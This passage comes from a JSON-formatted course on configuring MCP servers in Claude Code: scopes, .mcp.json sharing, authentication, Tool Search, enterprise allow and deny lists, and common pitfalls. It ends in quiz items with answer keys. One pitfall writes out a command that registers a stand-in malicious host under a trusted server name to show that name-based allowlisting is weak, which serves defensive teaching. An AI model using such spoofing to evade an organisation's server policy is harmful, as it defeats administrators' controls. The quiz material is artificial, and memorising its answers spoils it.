https://mcp.hubspot.com/anthropic\n\n# Stdio server with credentials injected via environment variable\nclaude mcp add --env AIRTABLE_API_KEY=YOUR_KEY --transport stdio airtable \\\n  -- npx -y airtable-mcp-server\n```\n\nNote the `--` separator for stdio servers: everything after `--` is passed to the server process unchanged. Without it, Claude Code tries to parse the server's flags (like `--port`) as its own options. Place at least one other option (such as `--transport` or `--env`) between `--env` and the server name, because if the server name comes directly after `--env`, the CLI reads the name as another `KEY=value` pair and rejects it.\n\n### What local scope looks like in storage\n\nRunning `claude mcp add --scope local --transport http stripe https://mcp.stripe.com` from `/path/to/your/project` writes this into `~/.claude.json`:\n\n```json\n{\n  \"projects\": {\n    \"/path/to/your/project\": {\n      \"mcpServers\": {\n        \"stripe\": {\n          \"type\": \"http\",\n          \"url\": \"https://mcp.stripe.com\"\n        }\n      }\n    }\n  }\n}\n```\n\nUser-scoped servers live in the same `~/.claude.json` file but are not namespaced under a project path.\n\n### Changing scope requires remove-then-re-add\n\nScope is fixed when a server is added. There is no `claude mcp move` command. To change a server from local to project scope:\n\n```bash\nclaude mcp remove stripe          # removes from current scope\nclaude mcp add --transport http stripe --scope project https://mcp.stripe.com\n```"
   },
   {
    "heading": "Configuration-as-Code Distribution: .mcp.json and the Team Workflow",
    "body": "The canonical mechanism for sharing MCP servers with a team is committing `.mcp.json` to version control. When a developer clones your repo, Claude Code picks up the file and — after an approval prompt — connects to the same servers you configured. This is **configuration-as-code distribution**.\n\n### .mcp.json format\n\n```json\n{\n  \"mcpServers\": {\n    \"github\": {\n      \"type\": \"http\",\n      \"url\": \"https://api.githubcopilot.com/mcp/\",\n      \"headers\": {\n        \"Authorization\": \"Bearer ${GITHUB_PAT}\"\n      }\n    },\n    \"sentry\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.sentry.dev/mcp\"\n    },\n    \"db\": {\n      \"type\": \"stdio\",\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@bytebase/dbhub\",\n               \"--dsn\", \"postgresql://readonly:${DB_PASS}@${DB_HOST:-localhost}:5432/prod\"],\n      \"env\": {\n        \"CACHE_DIR\": \"${HOME}/.cache/dbhub\"\n      }\n    }\n  }\n}\n```\n\n### Environment variable expansion keeps secrets out of git\n\nClaude Code expands `${VAR}` and `${VAR:-default}` syntax in these fields of `.mcp.json`:\n- `command`\n- `args`\n- `env`\n- `url`\n- `headers`\n\nIf a required environment variable has no default and is not set in the environment, Claude Code fails to parse the config — it does not silently substitute an empty string.\n\nThe variable `CLAUDE_PROJECT_DIR` is set by Claude Code in the **spawned server's** environment (not in Claude Code's own environment), pointing to the project root. Read it from inside your server process (`process.env.CLAUDE_PROJECT_DIR` in Node, `os.environ[\"CLAUDE_PROJECT_DIR\"]` in Python). If you need to reference it in `.mcp.json` `command` or `args`, use the default form because expansion runs in Claude Code's own environment at parse time, before the server starts:\n\n```json\n\"args\": [\"--project\", \"${CLAUDE_PROJECT_DIR:-.}\"]\n```\n\nPlugin-provided MCP configurations substitute `${CLAUDE_PROJECT_DIR}` directly and don't need the `:-` default.\n\n### What the approval prompt looks like\n\nA new clone of your repo triggers a workspace trust prompt before loading any server from `.mcp.json`. This is intentional security friction — it prevents a malicious `.mcp.json` in a repo you just cloned from silently running arbitrary processes. To see approval status:\n\n```bash\nclaude mcp list    # shows \"⏸ Pending approval\" for unapproved servers\nclaude mcp get github    # details for one server; shows pending/rejected status\n```\n\nTo reset all approval choices for the current project:\n```bash\nclaude mcp reset-project-choices\n```\n\n### Committed vs personal — what goes where\n\n| Configuration | File | Committed? | Purpose |\n|---|---|---|---|\n| Team MCP servers (no secrets) | `.mcp.json` | Yes | Everyone gets the same servers |\n| Secret values (tokens, passwords) | Shell environment, CI secrets | Never | Keep out of git |\n| Personal/experimental servers | `~/.claude.json` (local or user scope) | No | Private to you |\n| Project approval decisions | `~/.claude.json` | No | Per-user; not shared |\n| Claude Code project settings | `.claude/settings.json` | Yes | Permissions, hooks, model config |\n| Personal overrides to project settings | `.claude/settings.local.json` | No | Per-developer machine |\n\n### CLAUDE_PROJECT_DIR for relative paths in server code\n\nStdio servers receive `CLAUDE_PROJECT_DIR` automatically in their environment; they don't have to parse arguments for it. A Python server can resolve project-relative paths cleanly:\n\n```python\nimport os\nproject_root = os.environ.get(\"CLAUDE_PROJECT_DIR\", os.getcwd())\nconfig_path = os.path.join(project_root, \".myserver/config.yaml\")\n```\n\nServers can also call the MCP `roots/list` request, which returns the directory Claude Code was launched from."
   },
   {
    "heading": "Scope Precedence: Non-Merging, Highest Wins",
    "body": "When the same server name is defined in multiple places, Claude Code connects to it exactly once. The **entire entry** from the highest-precedence source wins. No field merging happens across scopes — you cannot, for example, override only the URL from a higher scope while inheriting the auth headers from a lower one.\n\n### Precedence order (highest to lowest)\n\n1. **Local** — private to you in this project\n2. **Project** — team-shared `.mcp.json`\n3. **User** — your cross-project servers\n4. **Plugin-provided servers** — bundled inside plugins\n5. **claude.ai connectors** — synced from your claude.ai account\n\nLocal overrides project, which overrides user. This lets a developer shadow a team server with their own local configuration — useful when one person needs to point at a staging endpoint while the rest of the team hits production.\n\n### How duplicates are detected\n\nThe three user-controlled scopes match duplicates **by name**. If `local`, `project`, and `user` all define a server named `github`, only the local-scope entry loads.\n\nPlugins and claude.ai connectors match differently: **by endpoint** (URL or command), not by name. A plugin that points at the same URL as a user-scope server is treated as a duplicate even if the names differ. When this happens, `/mcp` lists the connector as hidden and shows how to remove the duplicate.\n\n### The non-merging rule is load-bearing\n\nIf you have a project `.mcp.json` entry for `internal-api` with a `headersHelper` script, and a team member adds a local-scope entry for `internal-api` with a different URL, their local entry wins entirely — including the absence of a `headersHelper`. That server may now connect to a different endpoint with no auth. This is expected behavior, but it means:\n\n- Never rely on \"inheriting\" fields from a lower-precedence entry\n- Document which scope each server belongs to and why\n- If a server requires mandatory auth, enforce it at the managed tier (see enterprise section)\n\n### The reserved server name\n\nThe name `workspace` is reserved for Claude Code's internal use. If your configuration defines a server with that name, Claude Code skips it at load time and shows a warning asking you to rename it.\n\n### Managed configuration sits outside this hierarchy\n\n`managed-mcp.json` is not part of the numbered precedence list above — it operates as an entirely separate mechanism. When `managed-mcp.json` is deployed, Claude Code loads **only** the servers that file defines. User, project, and local server configurations do not load at all. See the enterprise section for how this interacts with allowlists and denylists."
   },
   {
    "heading": "Plugin-Bundled MCP Servers: Zero-Touch Consistency",
    "body": "Plugins can bundle MCP servers inside themselves, so the tools auto-start when the plugin is enabled. This is **plugin-bundled MCP**: no one runs `claude mcp add`, no one manages a separate `.mcp.json` entry, and every developer gets the same toolset the moment they install the plugin.\n\n### How a plugin defines MCP servers\n\nA plugin can declare servers in two ways. In `.mcp.json` at the plugin root:\n\n```json\n{\n  \"mcpServers\": {\n    \"database-tools\": {\n      \"command\": \"${CLAUDE_PLUGIN_ROOT}/servers/db-server\",\n      \"args\": [\"--config\", \"${CLAUDE_PLUGIN_ROOT}/config.json\"],\n      \"env\": {\n        \"DB_URL\": \"${DB_URL}\"\n      }\n    }\n  }\n}\n```\n\nOr inline in `plugin.json`:\n\n```json\n{\n  \"name\": \"my-plugin\",\n  \"mcpServers\": {\n    \"plugin-api\": {\n      \"command\": \"${CLAUDE_PLUGIN_ROOT}/servers/api-server\",\n      \"args\": [\"--port\", \"8080\"]\n    }\n  }\n}\n```\n\n### Special environment variables available inside plugins\n\n| Variable | Value |\n|---|---|\n| `${CLAUDE_PLUGIN_ROOT}` | Directory where the plugin is installed |\n| `${CLAUDE_PLUGIN_DATA}` | Persistent data directory that survives plugin updates |\n| `${CLAUDE_PROJECT_DIR}` | Project root of the active session |\n\nPlugin configurations substitute `${CLAUDE_PROJECT_DIR}` directly without needing a `:-` default — unlike `.mcp.json` files at project or user scope, where the expansion runs in Claude Code's own environment rather than the server's.\n\n### Lifecycle\n\nPlugin MCP servers start automatically at session startup for every enabled plugin. If you enable or disable a plugin during a session, run `/reload-plugins` to connect or disconnect its servers without restarting. Plugin servers are managed through plugin installation, not through `/mcp` commands.\n\n### Tool naming convention for plugin servers\n\nTools from plugin-bundled servers get a compound name: `mcp__plugin_<plugin-name>_<server-name>__<tool-name>`. Characters outside `A-Z`, `a-z`, `0-9`, `_`, and `-` are replaced with `_`. For a plugin named `my-plugin` with server key `database-tools` and tool `query`:\n\n```\nmcp__plugin_my-plugin_database-tools__query\n```\n\nUse this full name in permission rules, skill `allowed-tools` lists, and subagent `tools` fields.\n\n### Plugin-bundled vs manual .mcp.json — when to use which\n\n| Approach | Best when | Tradeoff |\n|---|---|---|\n| Plugin-bundled | Tools are tightly coupled to the plugin's workflow; you want zero-config distribution; you control the plugin | Users can't customize the server config; removing the server requires removing the plugin |\n| `.mcp.json` (project scope) | Server is independent; different team members may need different configs (e.g., staging vs prod DSN); server is from a third party | Requires each user to approve on first use; developers can accidentally override |\n| `managed-mcp.json` | Org-wide enforcement; security policy; no user discretion wanted | Requires MDM/GPO deployment; users can't add their own servers |\n\nFor internal tooling that every developer in your org must use uniformly, the plugin-bundled approach paired with a managed plugin marketplace is the highest-consistency path."
   },
   {
    "heading": "MCP Authentication: OAuth, Static Headers, and headersHelper",
    "body": "MCP servers that guard real data behind real credentials require authentication from Claude Code. Three mechanisms are available, each suited to different scenarios.\n\n### OAuth 2.0 (remote HTTP servers only)\n\nOAuth is available only for HTTP (and SSE) transports. Claude Code triggers OAuth automatically when a remote server responds with `401 Unauthorized` or `403 Forbidden`. The server appears flagged in `/mcp`, and you run the OAuth flow from there:\n\n```bash\n# Add the server (no credentials needed yet)\nclaude mcp add --transport http sentry https://mcp.sentry.dev/mcp\n\n# Trigger OAuth from inside a Claude Code session\n/mcp\n# → follow the browser flow\n\n# Or trigger OAuth from the command line (requires v2.1.186+)\nclaude mcp login sentry\n\n# Headless SSH environment: prints URL, paste redirect URL back at prompt\n# Requires an interactive terminal (connect with ssh -t)\nclaude mcp login sentry --no-browser\n```\n\nTokens are stored in the system keychain (macOS) or a credentials file and refreshed automatically. To clear stored credentials:\n\n```bash\nclaude mcp logout sentry\n```\n\nIf a server uses a registered OAuth app rather than Dynamic Client Registration, supply credentials when adding the server:\n\n```bash\nclaude mcp add --transport http \\\n  --client-id your-client-id --client-secret --callback-port 8080 \\\n  my-server https://mcp.example.com/mcp\n```\n\n`--client-secret` prompts for the secret with masked input. To avoid the prompt in CI, set the secret via environment variable:\n\n```bash\nMCP_CLIENT_SECRET=your-secret claude mcp add --transport http \\\n  --client-id your-client-id --client-secret --callback-port 8080 \\\n  my-server https://mcp.example.com/mcp\n```\n\nTo restrict which OAuth scopes Claude Code requests, pin them in `.mcp.json` using the `oauth.scopes` field (a single space-separated string, matching the RFC 6749 §3.3 `scope` parameter format):\n\n```json\n{\n  \"mcpServers\": {\n    \"slack\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.slack.com/mcp\",\n      \"oauth\": {\n        \"scopes\": \"channels:read chat:write search:read\"\n      }\n    }\n  }\n}\n```\n\n`oauth.scopes` takes precedence over both the server's advertised scope list and `authServerMetadataUrl`-discovered scopes. The security value is real: if an upstream server later adds a `files:write` scope, your pinned scope list prevents Claude Code from automatically acquiring that permission on the next token refresh.\n\n**One OAuth failure mode to know:** if you configure `headers.Authorization` for a server and the server rejects that header, Claude Code reports the connection as failed rather than falling back to OAuth. Remove the static header if you want the OAuth flow to trigger.\n\n### Static bearer token (`headers`)\n\nFor servers that issue long-lived API keys — GitHub PATs, internal tokens with manual rotation — pass a static header:\n\n```bash\nclaude mcp add --transport http github https://api.githubcopilot.com/mcp/ \\\n  --header \"Authorization: Bearer YOUR_GITHUB_PAT\"\n```\n\nIn `.mcp.json` with env-var expansion to keep the secret out of the file:\n\n```json\n{\n  \"mcpServers\": {\n    \"github\": {\n      \"type\": \"http\",\n      \"url\": \"https://api.githubcopilot.com/mcp/\",\n      \"headers\": {\n        \"Authorization\": \"Bearer ${GITHUB_PAT}\"\n      }\n    }\n  }\n}\n```\n\n### headersHelper (dynamic auth)\n\nFor internal SSO, Kerberos, short-lived tokens, or any scheme OAuth doesn't cover, `headersHelper` runs a command at connection time and merges its stdout into the request headers:\n\n```json\n{\n  \"mcpServers\": {\n    \"internal-api\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.internal.example.com\",\n      \"headersHelper\": \"/opt/bin/get-mcp-auth-headers.sh\"\n    }\n  }\n}\n```\n\nThe command must write a JSON object of string key-value pairs to stdout. It runs in a shell with a 10-second timeout. Dynamic headers override any static `headers` with the same name. Two environment variables are always set when the helper runs:\n\n| Variable | Value |\n|---|---|\n| `CLAUDE_CODE_MCP_SERVER_NAME` | The name of the MCP server being connected |\n| `CLAUDE_CODE_MCP_SERVER_URL` | The URL of the MCP server |\n\nThis lets a single helper script dispatch auth for multiple servers. The helper runs fresh on every connection (session start and reconnect) with no caching — your script is responsible for any token reuse.\n\n**Security note:** `headersHelper` executes arbitrary shell commands. When defined at project or local scope, it runs only after you accept the workspace trust dialog.\n\n### Authentication comparison table\n\n| Method | Transports | Rotation | Secret storage | Best for |\n|---|---|---|---|---|\n| OAuth 2.0 | HTTP and SSE only | Automatic | System keychain | SaaS tools with OAuth support |\n| Static `headers` | HTTP, SSE, WebSocket | Manual | Env var or keychain | Long-lived API keys |\n| `headersHelper` | HTTP, SSE, WebSocket | Per-connection | Your auth system | SSO, Kerberos, short-lived tokens |"
   },
   {
    "heading": "Tool Search and Context Budget: Scaling Beyond a Handful of Servers",
    "body": "The naive approach to MCP tooling — load every tool definition at session start — breaks at scale. If you have 10 servers each exposing 30 tools, you burn context on tool schemas that Claude may never need. **Tool Search** is the default mechanism that avoids this cost.\n\n### How Tool Search works\n\nWith Tool Search enabled (the default), only **tool names and server-level instructions** load at session start. Full tool definitions (parameter schemas, descriptions) are deferred. When Claude determines during a task that it needs external tools, it calls a `ToolSearch` pseudo-tool to discover relevant ones by name or description. Only the matched tool definitions enter context.\n\nFrom your perspective as a developer or user, MCP tools still work exactly as before — Claude uses them when relevant. The only behavioral difference is a `ToolSearch` step that may briefly appear in the transcript before a tool is actually called.\n\nIf a needed server is still connecting in the background when Claude wants to use it, Claude Code waits for that server before continuing. With Tool Search enabled the wait happens inside the `ToolSearch` call. In configurations without Tool Search (Vertex AI, a custom `ANTHROPIC_BASE_URL`, or `ENABLE_TOOL_SEARCH=false`), a `WaitForMcpServers` tool handles the wait instead.\n\n**Claude Code does not impose a fixed per-server tool cap.** The practical limit is your context-window budget. Tool Search means adding more servers has minimal impact on context at session start, since full schemas are paid only for tools Claude actually uses.\n\n### Tool Search requirements\n\nTool Search requires a model that supports `tool_reference` blocks:\n- **Haiku models** do not support Tool Search\n- **Vertex AI**: supported for Claude Sonnet 4.5 and later, and Claude Opus 4.5 and later\n- **Proxies**: disabled by default when `ANTHROPIC_BASE_URL` points to a non-first-party host, since most proxies do not forward `tool_reference` blocks\n\n### Configuring Tool Search behavior\n\nControl Tool Search with the `ENABLE_TOOL_SEARCH` environment variable:\n\n| Value | Behavior |\n|---|---|\n| (unset) | All MCP tools deferred and loaded on demand. Falls back to loading upfront on Vertex AI or when `ANTHROPIC_BASE_URL` is a non-first-party host |\n| `true` | All MCP tools deferred. Claude Code sends the beta header even on Vertex AI and through proxies. Requests fail on unsupported models or proxies that don't forward `tool_reference` blocks |\n| `auto` | Threshold mode: tools load upfront if schemas fit within 10% of the context window, deferred otherwise |\n| `auto:N` | Threshold mode with a custom percentage (0–100). Example: `auto:5` for 5% |\n| `false` | All tool schemas load upfront; no deferral |\n\n```bash\n# Use a custom 5% threshold\nENABLE_TOOL_SEARCH=auto:5 claude\n\n# Disable entirely: all schemas load at session start\nENABLE_TOOL_SEARCH=false claude\n```\n\nOr set it in your project `.claude/settings.json` `env` field:\n\n```json\n{\n  \"env\": {\n    \"ENABLE_TOOL_SEARCH\": \"auto:15\"\n  }\n}\n```\n\n### Blocking the ToolSearch tool\n\nYou can deny the `ToolSearch` tool itself for compliance or auditability reasons. This disables Tool Search and causes Claude Code to fall back to loading all schemas upfront:\n\n```json\n{\n  \"permissions\": {\n    \"deny\": [\"ToolSearch\"]\n  }\n}\n```\n\n### Exempting specific servers from deferral\n\nFor tools Claude needs on virtually every turn, set `alwaysLoad: true` in the server's config. The field is available on all server types and requires Claude Code v2.1.121 or later:\n\n```json\n{\n  \"mcpServers\": {\n    \"core-tools\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.example.com/mcp\",\n      \"alwaysLoad\": true\n    }\n  }\n}\n```\n\nSetting `alwaysLoad: true` also blocks session startup until that server connects, capped at the standard 5-second connect timeout. Use it only for a small set of genuinely essential tools — each upfront tool consumes context that would otherwise be available for conversation.\n\nIndividual tools can also declare themselves always-loaded by setting `\"anthropic/alwaysLoad\": true` in the tool's `_meta` object in the server's `tools/list` response. This lets a server author decide which of their tools are high-frequency without forcing the caller to configure anything.\n\n### Writing good server instructions\n\nServer instructions (the server-level description field in the MCP server's metadata) become more important when Tool Search is enabled — they're how Claude decides which server to search when a task might benefit from external tools. Claude Code truncates both tool descriptions and server instructions at 2 KB each, so keep them concise and put the most critical details near the start."
   },
   {
    "heading": "Enterprise Managed MCP Governance: Locking the Toolbox",
    "body": "When you need org-wide consistency — approved server sets, blocked categories, or complete MCP lockdown — you move from per-user configuration to **enterprise managed MCP governance**. Two mechanisms work together: `managed-mcp.json` for deploying a fixed set with exclusive control, and `allowedMcpServers`/`deniedMcpServers` for policy-based filtering.\n\n### managed-mcp.json: exclusive control\n\nWhen Claude Code finds a `managed-mcp.json` at the OS-specific system path, it loads **only** the servers that file defines. Users cannot add, modify, or use any other MCP server — including project `.mcp.json` servers, plugin-provided servers, and claude.ai connectors (unless you opt those back in with `allowAllClaudeAiMcps` in a managed settings source).\n\n| Platform | Path |\n|---|---|\n| macOS | `/Library/Application Support/ClaudeCode/managed-mcp.json` |\n| Linux / WSL | `/etc/claude-code/managed-mcp.json` |\n| Windows | `C:\\Program Files\\ClaudeCode\\managed-mcp.json` |\n\nThe file format is identical to `.mcp.json`:\n\n```json\n{\n  \"mcpServers\": {\n    \"github\": {\n      \"type\": \"http\",\n      \"url\": \"https://api.githubcopilot.com/mcp/\"\n    },\n    \"sentry\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.sentry.dev/mcp\"\n    },\n    \"company-internal\": {\n      \"type\": \"stdio\",\n      \"command\": \"/usr/local/bin/company-mcp-server\",\n      \"args\": [\"--config\", \"/etc/company/mcp-config.json\"],\n      \"env\": {\n        \"COMPANY_API_URL\": \"https://internal.example.com\"\n      }\n    }\n  }\n}\n```\n\n**Do not store API keys in `managed-mcp.json` env blocks** — the file is readable by any user on the machine. Use `${VAR}` expansion (each user must export the variable), OAuth, or `headersHelper` to handle per-user credentials.\n\nTo **disable MCP entirely**, deploy an empty server map:\n\n```json\n{\n  \"mcpServers\": {}\n}\n```\n\n### Deploy via MDM / fleet management\n\n`managed-mcp.json` cannot be delivered through Claude Code's server-managed settings — it must be written to the system path by a process with administrator privileges. In practice:\n- **macOS**: Jamf, Kandji, or a configuration profile\n- **Windows**: Group Policy (GPO) or Intune\n- **Linux**: fleet management tooling, Ansible, Chef, or a provisioning script\n\n### Validating the configuration on a managed machine\n\n```bash\n# 1. Confirm only managed servers appear\nclaude mcp list\n\n# 2. Confirm users cannot add servers\nclaude mcp add --transport http test https://example.com/mcp\n# Expected: \"Cannot add MCP server: enterprise MCP configuration is active\n#            and has exclusive control over MCP servers\"\n```\n\n### allowedMcpServers and deniedMcpServers: policy-based filtering\n\nThese settings filter which servers are allowed to load, without deploying a fixed set. They work with servers that have already been added (by a user, plugin, or `managed-mcp.json`) — they are not a registry for deploying servers. Each entry matches servers by URL pattern, exact command array, or name:\n\n```json\n{\n  \"allowedMcpServers\": [\n    { \"serverUrl\": \"https://api.githubcopilot.com/*\" },\n    { \"serverUrl\": \"https://mcp.sentry.dev/*\" },\n    { \"serverCommand\": [\"npx\", \"-y\", \"@modelcontextprotocol/server-filesystem\", \".\"] },\n    { \"serverUrl\": \"https://*.internal.example.com/*\" }\n  ],\n  \"deniedMcpServers\": [\n    { \"serverUrl\": \"https://*.untrusted.example.com/*\" },\n    { \"serverName\": \"claude.ai Slack\" }\n  ]\n}\n```\n\n**Match semantics:**\n- `serverUrl`: exact match or `*` wildcards anywhere in the pattern. Hostname matching is case-insensitive. A pattern with no path matches any path (`https://mcp.example.com` matches all paths on that host).\n- `serverCommand`: exact match on the full command array, in order. `[\"npx\", \"-y\", \"server\"]` does not match `[\"npx\", \"server\"]` or `[\"npx\", \"-y\", \"server\", \"--flag\"]`.\n- `serverName`: the user-assigned label. **This is not a security control** — a user can name any server `github`. Use URL or command matching to enforce which servers actually run. In `deniedMcpServers`, `serverName` accepts any non-empty string and can be used to block claude.ai connectors by display name.\n\n**Leaving `allowedMcpServers` unset** is different from setting it to `[]`:\n\n| Setting | Unset | Empty array `[]` | Populated |\n|---|---|---|---|\n| `allowedMcpServers` | All servers allowed | No servers allowed | Only matching servers allowed |\n| `deniedMcpServers` | No servers blocked | No servers blocked | Matching servers blocked |\n\nWhen the allowlist contains `serverUrl` entries, remote servers must match a URL pattern to load — a name-only match is ignored. When it contains `serverCommand` entries, stdio servers must match a command exactly. Name-only entries in the allowlist only apply when no stricter entries (URL or command) exist for that transport type.\n\n### Making the allowlist authoritative with allowManagedMcpServersOnly\n\nWithout this flag, allowlists from every settings source merge — a user can add their own `allowedMcpServers` entries in `~/.claude/settings.json` to broaden the list. To prevent this:\n\n```json\n{\n  \"allowManagedMcpServersOnly\": true,\n  \"allowedMcpServers\": [\n    { \"serverUrl\": \"https://api.githubcopilot.com/*\" },\n    { \"serverUrl\": \"https://*.internal.example.com/*\" }\n  ]\n}\n```\n\nThis setting must live in a managed settings source (server-managed settings, `managed-settings.json`, MDM profile, or registry key). Placing it in user or project settings has no effect. Denylists always merge from every source regardless — users can always add to `deniedMcpServers` to block servers for themselves, but they cannot remove managed denylist entries.\n\n### How a server is evaluated (full order)\n\n1. Merge all allowlists (unless `allowManagedMcpServersOnly` is true, which drops non-managed allowlists)\n2. Merge all denylists from every source\n3. Check denylist — a match is an unconditional block\n4. Check allowlist — if unset, all servers pass; if set, remote servers must match by URL and stdio servers by command (name-only entries apply only when no URL or command entries exist for that transport)\n\n### What users see when a server is blocked\n\n| Restriction | What the user sees |\n|---|---|\n| `managed-mcp.json` present and user runs `claude mcp add` | `Cannot add MCP server: enterprise MCP configuration is active and has exclusive control over MCP servers` |\n| Server is on a denylist and user runs `claude mcp add` | `Cannot add MCP server \"<name>\": server is explicitly blocked by enterprise policy` |\n| Server isn't on the allowlist and user runs `claude mcp add` | `Cannot add MCP server \"<name>\": not allowed by enterprise policy` |\n| A previously configured server is now blocked by policy | Server silently disappears from `/mcp` and `claude mcp list` with no warning |\n\nIn the last case, the user gets no signal that policy is the reason. Tell affected users which servers are blocked when you roll out a new restriction.\n\n### Governance pattern selector\n\n| Pattern | Configuration | Use when |\n|---|---|---|\n| Disable MCP | `managed-mcp.json` with empty `mcpServers` | No MCP at all for this org |\n| Fixed deployment | `managed-mcp.json` with approved servers | Everyone gets identical tools |\n| Approved catalog | `allowedMcpServers` + `allowManagedMcpServersOnly: true` | Users choose from a vetted list |\n| Plugin servers only | `strictPluginOnlyCustomization` with `mcp` in list | Servers must come from plugins |\n| Soft allowlist | `allowedMcpServers` without `allowManagedMcpServersOnly` | Suggest approved servers; users can add more |\n| Denylist only | `deniedMcpServers` | Block known-bad servers; allow others |"
   },
   {
    "heading": "Management Commands Reference",
    "body": "A complete reference of the CLI commands and in-session commands you will use day-to-day.\n\n### Add commands\n\n```bash\n# HTTP server (recommended for remote)\nclaude mcp add --transport http <name> <url>\nclaude mcp add --transport http <name> --scope project <url>\nclaude mcp add --transport http <name> --header \"Authorization: Bearer TOKEN\" <url>\n\n# Stdio server (local process) — use -- to separate server args from Claude's flags\nclaude mcp add [--scope local|project|user] <name> -- <command> [args...]\nclaude mcp add --env KEY=value --transport stdio <name> -- <command>\n\n# WebSocket server — must use add-json (--transport ws is not supported)\nclaude mcp add-json <name> '{\"type\":\"ws\",\"url\":\"wss://mcp.example.com/socket\"}'\n\n# From raw JSON (useful in scripts)\nclaude mcp add-json <name> '{\"type\":\"http\",\"url\":\"https://...\"}'\n\n# Import from Claude Desktop (macOS and WSL only)\nclaude mcp add-from-claude-desktop\n```\n\n### Query and status\n\n```bash\nclaude mcp list              # all configured servers + approval status\nclaude mcp get <name>        # details for one server\n/mcp                         # in-session: panel with connection status and tool counts\n```\n\n### Authentication\n\n```bash\nclaude mcp login <name>               # run OAuth flow from CLI (requires v2.1.186+)\nclaude mcp login <name> --no-browser  # headless / SSH environments (requires ssh -t)\nclaude mcp logout <name>              # clear stored OAuth credentials\n```\n\n### Remove and reset\n\n```bash\nclaude mcp remove <name>\nclaude mcp reset-project-choices    # reset per-project approval decisions\n```\n\n### Use Claude Code itself as an MCP server\n\n```bash\nclaude mcp serve    # start Claude Code as a stdio MCP server for other clients\n```\n\n### Environment variables that affect MCP behavior\n\n| Variable | Effect |\n|---|---|\n| `MCP_TIMEOUT` | Server startup timeout in milliseconds (e.g., `MCP_TIMEOUT=10000`) |\n| `MCP_TOOL_TIMEOUT` | Per-tool execution timeout in milliseconds (default is approximately 28 hours) |\n| `MAX_MCP_OUTPUT_TOKENS` | Max tokens any MCP tool can return (default 25,000; warning logged at 10,000) |\n| `ENABLE_TOOL_SEARCH` | Tool Search mode: unset (default on), `true`, `auto`, `auto:N`, or `false` |\n| `ENABLE_CLAUDEAI_MCP_SERVERS` | Set to `false` to disable claude.ai connectors for this shell session |\n| `CLAUDE_PROJECT_DIR` | Set by Claude Code in the spawned server's environment; the project root path |\n| `OTEL_LOG_TOOL_DETAILS` | Set to `1` to include MCP server and tool names in OpenTelemetry events |"
   },
   {
    "heading": "Common Pitfalls and Failure Modes",
    "body": "These are the errors that appear most frequently when teams deploy MCP at scale.\n\n### Pitfall 1: Secrets committed to .mcp.json\n\nProject-scope `.mcp.json` is designed to be committed. Any literal API key in a `headers` or `env` field ends up in git history. Always use `${VAR}` expansion and document which environment variables each developer must set.\n\n### Pitfall 2: Expecting field merging across scopes\n\nThe non-merging rule is the single most common source of surprise. If a developer defines a local-scope `internal-api` server without `headersHelper`, and the project-scope entry has it, the local entry wins — no auth headers are sent. Audit your team's `~/.claude.json` files if servers start behaving unexpectedly.\n\n### Pitfall 3: serverName in allowlists as a security control\n\nThe docs are explicit: `serverName` in `allowedMcpServers` is not a security control. A user can run `claude mcp add --transport http github https://evil.example.com/mcp` and the allowlist entry `{ \"serverName\": \"github\" }` will match it. Additionally, once a `serverUrl` entry exists in the allowlist, name-only matches for remote servers are ignored entirely. Use `serverUrl` or `serverCommand` for actual enforcement.\n\n### Pitfall 4: Static Authorization header blocking OAuth fallback\n\nIf you configure `headers.Authorization` for a server and the token is invalid or expired, Claude Code marks the connection as failed — it does not fall back to the OAuth flow. Remove the static header to allow OAuth, or handle token rotation before the connection attempt (via `headersHelper`).\n\n### Pitfall 5: The `--` separator for stdio servers\n\n```bash\n# Wrong — Claude Code tries to parse --port as its own flag\nclaude mcp add myserver python server.py --port 8080\n\n# Right — everything after -- goes to the server process unchanged\nclaude mcp add --scope project myserver -- python server.py --port 8080\n```\n\nAlso watch for `--env` placement: if the server name immediately follows `--env`, the CLI reads the name as another `KEY=value` pair and rejects it. Always place at least one other flag (like `--transport` or `--scope`) between `--env` and the server name.\n\n### Pitfall 6: Silent server disappearance under managed policy\n\nWhen `managed-mcp.json` is deployed or a denylist is activated, previously configured servers stop loading with no warning visible to the user. They will report the server is \"missing\" — it disappeared because of policy, not a network problem. Communicate to affected users which servers are blocked when you roll out a restriction.\n\n### Pitfall 7: alwaysLoad blocking startup\n\nSetting `alwaysLoad: true` on a server that is unavailable at startup blocks the session until the 5-second connect timeout expires. Don't set `alwaysLoad` on servers that might be down or slow to start. Reserve it for a small number of tools Claude genuinely needs on every turn.\n\n### Pitfall 8: Scope name drift between Claude Code versions\n\nIn older Claude Code versions: `--scope project` (now `local`) and `--scope global` (now `user`). If you have runbooks, CI scripts, or internal docs using the old names, update them. The stored config format is the same; only the flag name changed.\n\n### Pitfall 9: Tool Search disabled on proxies\n\nIf your team uses `ANTHROPIC_BASE_URL` pointing to a proxy or gateway that doesn't forward `tool_reference` blocks, Tool Search silently falls back to loading all schemas upfront. This may work fine but will consume more context. Set `ENABLE_TOOL_SEARCH=false` explicitly so the behavior is intentional rather than a silent fallback.\n\n### Pitfall 10: headersHelper path not portable across machines\n\nA `headersHelper` path like `/opt/bin/get-mcp-auth-headers.sh` works on your machine. It may not exist on a colleague's. Either document the prerequisite, bundle the script in the repo and use a relative path via `${CLAUDE_PROJECT_DIR}`, or move the server to a plugin where the script ships with the plugin.\n\n### Pitfall 11: WebSocket servers require add-json, not --transport\n\nThe `claude mcp add --transport` flag does not accept `ws`. Attempting `claude mcp add --transport ws ...` will fail. Configure WebSocket servers through `.mcp.json` directly or with `claude mcp add-json`."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team commits a `.mcp.json` with a Slack MCP server and pushes it. A new teammate clones the repo and runs `claude`. What happens when they try to use the Slack server?",
    "options": [
     "The server connects automatically — project-scoped servers start without any prompt.",
     "They see an approval prompt before Claude connects to the project-scoped server for the first time.",
     "The server is ignored because `.mcp.json` is only read on the machine that created it.",
     "They must run `claude mcp add --scope project slack ...` themselves before it appears."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Project-scoped servers in `.mcp.json` are shared via VCS, but Claude Code shows an approval prompt before first connect — it does not silently connect servers committed by others."
   },
   {
    "prompt": "You add a server with `claude mcp add --scope user my-docs-server -- npx my-docs`. Later you want it to be project-scoped instead. What is the correct procedure?",
